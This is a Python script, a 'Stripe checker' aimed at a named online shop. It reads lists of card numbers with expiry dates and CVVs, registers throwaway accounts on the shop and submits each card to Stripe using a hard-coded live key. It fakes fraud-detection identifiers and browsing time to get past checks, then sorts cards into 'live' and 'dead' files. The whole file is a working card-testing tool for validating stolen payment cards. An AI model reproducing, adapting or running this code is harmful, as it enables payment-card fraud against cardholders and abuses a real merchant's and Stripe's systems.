"""
WayuuMarket Stripe Checker v4.0
Gets REAL decline/success responses
"""
import requests
import random
import string
import uuid
import time
import os
import re
import json

INPUT_FILE = "cards.txt"
LIVE_FILE = "live.txt"  
DEAD_FILE = "dead.txt"
DELAY = 3

def log(msg):
    print(f"[*] {msg}")

def randmail():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + '@gmail.com'

def get_bin(cc):
    try:
        r = requests.get(f'https://lookup.binlist.net/{cc[:6]}', timeout=5)
        if r.status_code == 200:
            d = r.json()
            return f"{d.get('scheme','').upper()} | {d.get('bank',{}).get('name','')} | {d.get('country',{}).get('name','')}"
    except:
        pass
    return cc[:6]

def check_card(cc, mes, ano, cvv):
    if len(str(ano)) == 4:
        ano = str(ano)[-2:]
    mes = str(mes).zfill(2)
    
    s = requests.Session()
    s.headers.update({
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    })
    
    # Step 1: Register
    log("Registering...")
    r = s.get('https://wayuumarket.com/my-account/', timeout=30)
    
    m = re.search(r'name="woocommerce-register-nonce"\s*value="([^"]+)"', r.text)
    if not m:
        return 'ERROR', 'No register nonce'
    
    email = randmail()
    s.post('https://wayuumarket.com/my-account/', data={
        'email': email,
        'woocommerce-register-nonce': m.group(1),
        'register': 'Register',
    }, timeout=30)
    
    # Step 2: Get add-payment-method page and extract ALL data
    log("Getting payment page...")
    r = s.get('https://wayuumarket.com/my-account/add-payment-method/', timeout=30)
    html = r.text
    
    # Find setup intent nonce - search entire page
    setup_nonce = None
    
    # Try to find in wc_stripe_params
    for pattern in [
        r'wc_stripe_params\s*=\s*(\{[^<]+\})\s*;',
        r'var\s+wc_stripe_params\s*=\s*(\{.*?\});',
    ]:
        m = re.search(pattern, html, re.DOTALL)
        if m:
            params_str = m.group(1)
            # Look for nonce
            n = re.search(r'"createSetupIntentNonce"\s*:\s*"([^"]+)"', params_str)
            if n:
                setup_nonce = n.group(1)
                log(f"Found nonce: {setup_nonce[:15]}...")
                break
    
    # Try direct search
    if not setup_nonce:
        for p in [
            r'"createSetupIntentNonce"\s*:\s*"([^"]+)"',
            r'createSetupIntentNonce[\'"\s:]+[\'"]([^\'"]+)[\'"]',
            r'"nonce"\s*:\s*"([a-f0-9]{10})"',
        ]:
            m = re.search(p, html)
            if m:
                setup_nonce = m.group(1)
                log(f"Found nonce: {setup_nonce}")
                break
    
    # Step 3: Create Payment Method with radar token
    log("Creating payment method...")
    
    guid = str(uuid.uuid4()) + ''.join(random.choices('0123456789abcdef', k=6))
    muid = str(uuid.uuid4()) + ''.join(random.choices('0123456789abcdef', k=6))
    sid = str(uuid.uuid4()) + ''.join(random.choices('0123456789abcdef', k=6))
    
    pm_data = {
        'type': 'card',
        'billing_details[name]': 'John Smith',
        'billing_details[email]': email,
        'card[number]': cc,
        'card[cvc]': cvv,
        'card[exp_month]': mes,
        'card[exp_year]': ano,
        'guid': guid,
        'muid': muid,
        'sid': sid,
        'payment_user_agent': 'stripe.js/83a1f53796; stripe-js-v3/83a1f53796; split-card-element',
        'referrer': 'https://wayuumarket.com',
        'time_on_page': str(random.randint(80000, 200000)),
        'key': 'pk_live_51KDcNrImW2Hlp9sc4dxVEesSbWiCa3eqc1g7JIVFf0oa2tePZ7KAkaPSe3tgV0NrHnAgHDGZxZtGqDXRCbFqz0n000pyW5QR3A',
        '_stripe_version': '2024-06-20',
    }
    
    pm_resp = requests.post(
        'https://api.stripe.com/v1/payment_methods',
        headers={
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
        },
        data=pm_data,
        timeout=30
    ).json()
    
    # Check PM errors - these are REAL responses
    if 'error' in pm_resp:
        err = pm_resp['error']
        code = err.get('decline_code') or err.get('code', '')
        msg = err.get('message', '')
        
        # CCN - Card is LIVE but has issues
        ccn_codes = [
            'incorrect_cvc', 'invalid_cvc', 'insufficient_funds', 
            'generic_decline', 'expired_card', 'lost_card', 'stolen_card',
            'do_not_honor', 'card_velocity_exceeded', 'pickup_card',
            'restricted_card', 'security_violation', 'fraudulent',
            'transaction_not_allowed', 'card_not_supported'
        ]
        
        if code in ccn_codes:
            return 'CCN', f"Declined: {code}"
        
        if 'Your card was declined' in msg:
            return 'CCN', 'Card Declined'
        
        if 'invalid' in msg.lower() or 'invalid' in code.lower():
            return 'DEAD', f"Invalid: {code or msg[:30]}"
        
        return 'DEAD', code or msg[:40]
    
    pm_id = pm_resp.get('id', '')
    if not pm_id:
        return 'ERROR', 'No PM ID'
    
    log(f"PM: {pm_id[:20]}...")
    
    # Step 4: Try setup intent if we have nonce
    if setup_nonce:
        log("Confirming setup intent...")
        
        si_resp = s.post(
            'https://wayuumarket.com/?wc-ajax=wc_stripe_create_setup_intent',
            headers={
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'x-requested-with': 'XMLHttpRequest',
            },
            data={
                'stripe_source_id': pm_id,
                'nonce': setup_nonce,
            },
            timeout=30
        )
        
        try:
            j = si_resp.json()
            log(f"Response: {str(j)[:100]}")
            
            # Success!
            if j.get('success') == True:
                return 'CHARGED', 'Card Added Successfully!'
            
            # Check for decline in response
            err = j.get('error', '')
            if isinstance(err, dict):
                err = err.get('message', str(err))
            
            err_str = str(err).lower()
            
            # Real decline responses
            if 'declined' in err_str:
                return 'CCN', 'Card Declined'
            if 'insufficient' in err_str:
                return 'CCN', 'Insufficient Funds'
            if 'cvc' in err_str or 'security' in err_str:
                return 'CCN', 'CVC Failed'
            if 'expired' in err_str:
                return 'CCN', 'Card Expired'
            if 'lost' in err_str or 'stolen' in err_str:
                return 'CCN', 'Lost/Stolen Card'
            if 'authentication' in err_str or '3d' in err_str:
                return 'CCN', '3DS Required'
            if 'verify your request' in err_str:
                # Nonce issue - use PM result
                pass
            else:
                if err:
                    return 'DEAD', str(err)[:40]
        except:
            pass
    
    # If we got here, PM was created = card format is valid
    # But we didn't get a real charge response
    brand = pm_resp.get('card', {}).get('brand', '').upper()
    checks = pm_resp.get('card', {}).get('checks', {})
    cvc_check = checks.get('cvc_check', '')
    
    if cvc_check == 'fail':
        return 'CCN', 'CVC Check Failed'
    elif cvc_check == 'pass':
        return 'LIVE', f'Valid Card ({brand})'
    else:
        return 'LIVE', f'Card Valid ({brand})'

def main():
    print("""
    ╔═══════════════════════════════════════╗
    ║    WAYUUMARKET CHECKER v4.0           ║
    ║    Real Decline Responses             ║
    ╚═══════════════════════════════════════╝
    """)
    
    if not os.path.exists(INPUT_FILE):
        with open(INPUT_FILE, 'w') as f:
            f.write("# cc|mm|yy|cvv\n")
        print(f"Created {INPUT_FILE}")
        return
    
    with open(INPUT_FILE, 'r') as f:
        cards = [l.strip() for l in f if '|' in l and not l.startswith('#')]
    
    if not cards:
        print("No cards!")
        return
    
    print(f"Cards: {len(cards)}")
    print("=" * 40)
    
    charged = ccn = live = dead = 0
    
    for i, card in enumerate(cards, 1):
        p = card.split('|')
        if len(p) < 4:
            continue
        
        cc, mes, ano, cvv = p[0], p[1], p[2], p[3]
        full = f"{cc}|{mes}|{ano}|{cvv}"
        
        print(f"\n[{i}/{len(cards)}] {cc[:6]}xxxxxx{cc[-4:]}")
        
        start = time.time()
        status, msg = check_card(cc, mes, ano, cvv)
        t = round(time.time() - start, 2)
        
        if status == 'CHARGED':
            print(f"✓ [CHARGED] {full}")
            print(f"  {msg}")
            print(f"  {get_bin(cc)}")
            charged += 1
            with open(LIVE_FILE, 'a') as f:
                f.write(f"{full}|CHARGED|{msg}\n")
                
        elif status == 'CCN':
            print(f"● [CCN] {full}")
            print(f"  {msg}")
            print(f"  {get_bin(cc)}")
            ccn += 1
            with open(LIVE_FILE, 'a') as f:
                f.write(f"{full}|CCN|{msg}\n")
                
        elif status == 'LIVE':
            print(f"○ [LIVE] {full}")
            print(f"  {msg}")
            print(f"  {get_bin(cc)}")
            live += 1
            with open(LIVE_FILE, 'a') as f:
                f.write(f"{full}|LIVE|{msg}\n")
                
        else:
            print(f"✗ [DEAD] {full}")
            print(f"  {msg}")
            dead += 1
            with open(DEAD_FILE, 'a') as f:
                f.write(f"{full}|{msg}\n")
        
        print(f"  [{t}s]")
        
        if i < len(cards):
            time.sleep(DELAY)
    
    print("\n" + "=" * 40)
    print(f"CHARGED: {charged}")
    print(f"CCN:     {ccn}")
    print(f"LIVE:    {live}")
    print(f"DEAD:    {dead}")
    print("=" * 40)

if __name__ == "__main__":
    main()
